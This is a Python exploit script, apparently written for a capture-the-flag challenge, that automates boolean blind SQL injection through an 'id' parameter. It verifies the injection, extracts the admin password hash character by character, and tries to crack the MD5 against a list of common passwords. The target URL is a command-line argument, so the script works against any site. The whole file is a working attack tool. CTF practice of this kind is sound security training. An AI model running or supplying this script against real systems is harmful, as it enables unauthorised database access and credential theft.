#!/usr/bin/env python3
"""
CTF Exploit Script - SQL Boolean Blind Injection
Target: http://localhost:8080/?id=1
Inject point: id parameter (integer injection)
Goal: Extract admin password from users table
"""

import requests
import argparse
import string
import time

DEFAULT_TARGET = "http://localhost:8080/"

HEXDIGITS = "0123456789abcdef"


def check(url, payload):
    """Send boolean blind injection payload, return True if condition is true."""
    try:
        resp = requests.get(url, params={"id": payload}, timeout=15)
        return "Username" in resp.text
    except requests.RequestException as e:
        print(f"[-] Request error: {e}")
        return False


def get_length(url, extract_expr):
    """Blind inject to get length of a string value."""
    print(f"[*] Getting length of ({extract_expr})...")
    for i in range(1, 128):
        payload = f"1 AND LENGTH({extract_expr})={i}"
        if check(url, payload):
            print(f"[+] Length = {i}")
            return i
    print("[-] Failed to determine length")
    return -1


def extract_char(url, extract_expr, pos, charset=HEXDIGITS):
    """Extract a single character at given position using binary search."""
    low, high = 0, len(charset) - 1
    while low <= high:
        mid = (low + high) // 2
        # Check if ord(char) > mid_ord
        payload = f"1 AND ASCII(SUBSTRING({extract_expr},{pos},1))>{ord(charset[mid])}"
        if check(url, payload):
            low = mid + 1
        else:
            high = mid - 1
    # low is the index of the matched char
    if 0 <= low < len(charset):
        return charset[low]
    return None


def extract_string(url, extract_expr, charset=HEXDIGITS):
    """Extract full string value via boolean blind injection."""
    length = get_length(url, extract_expr)
    if length <= 0:
        return ""

    result = ""
    for pos in range(1, length + 1):
        ch = extract_char(url, extract_expr, pos, charset)
        if ch is None:
            print(f"[-] Failed at position {pos}")
            break
        result += ch
        print(f"[+] Position {pos}/{length}: {ch}  ->  {result}")
    return result


def verify_injection(url):
    """Verify the injection point is valid."""
    print("[*] Verifying injection point...")
    # True condition
    if not check(url, "1 AND 1=1"):
        print("[-] True condition failed")
        return False
    # False condition
    if check(url, "1 AND 1=2"):
        print("[-] False condition returned true")
        return False
    print("[+] Injection point confirmed (boolean blind)")
    return True


def exploit(url):
    """Full blind injection exploit flow."""
    if not verify_injection(url):
        print("[-] Injection verification failed, aborting")
        return

    # Step 1: Confirm users table has data
    print("\n[*] Step 1: Confirm users table...")
    payload = "1 AND (SELECT COUNT(*) FROM users)>0"
    if check(url, payload):
        print("[+] users table exists and has data")
    else:
        print("[-] users table check failed")
        return

    # Step 2: Find admin user row
    print("\n[*] Step 2: Confirm admin user exists...")
    payload = "1 AND (SELECT COUNT(*) FROM users WHERE username='admin')=1"
    if check(url, payload):
        print("[+] admin user exists")
    else:
        print("[-] admin user not found")
        return

    # Step 3: Get password length
    print("\n[*] Step 3: Extract admin password length...")
    pwd_len = get_length(url, "(SELECT password FROM users WHERE username='admin')")
    if pwd_len <= 0:
        return
    print(f"[+] Admin password length: {pwd_len}")

    # Step 4: Extract password character by character
    print(f"\n[*] Step 4: Extract admin password ({pwd_len} chars)...")
    password = extract_string(url, "(SELECT password FROM users WHERE username='admin')")
    print(f"\n[+] Admin password (MD5): {password}")

    # Step 5: Try common MD5 lookup
    print("\n[*] Step 5: Attempting MD5 crack...")
    try_crack_md5(password)

    return password


def try_crack_md5(md5_hash):
    """Try to crack MD5 against common passwords."""
    import hashlib
    common = [
        "admin", "password", "123456", "admin123", "root",
        "admin888", "test", "guest", "qwerty", "abc123",
        "letmein", "welcome", "monkey", "master", "dragon",
        "login", "111111", "666666", "888888", "passw0rd",
    ]
    for word in common:
        if hashlib.md5(word.encode()).hexdigest() == md5_hash:
            print(f"[+] MD5 cracked! Plaintext: {word}")
            return
    print("[-] Not in common wordlist, try online MD5 lookup")


def main():
    parser = argparse.ArgumentParser(description="CTF Exploit - SQL Boolean Blind Injection")
    parser.add_argument("-u", "--url", type=str, default=DEFAULT_TARGET, help="Target URL")
    parser.add_argument("-v", "--verify", action="store_true", help="Only verify injection point")
    parser.add_argument("-e", "--extract", type=str, help="Custom SQL expression to extract")
    args = parser.parse_args()

    if args.verify:
        verify_injection(args.url)
    elif args.extract:
        result = extract_string(args.url, args.extract)
        print(f"\n[+] Extracted: {result}")
    else:
        exploit(args.url)


if __name__ == "__main__":
    main()
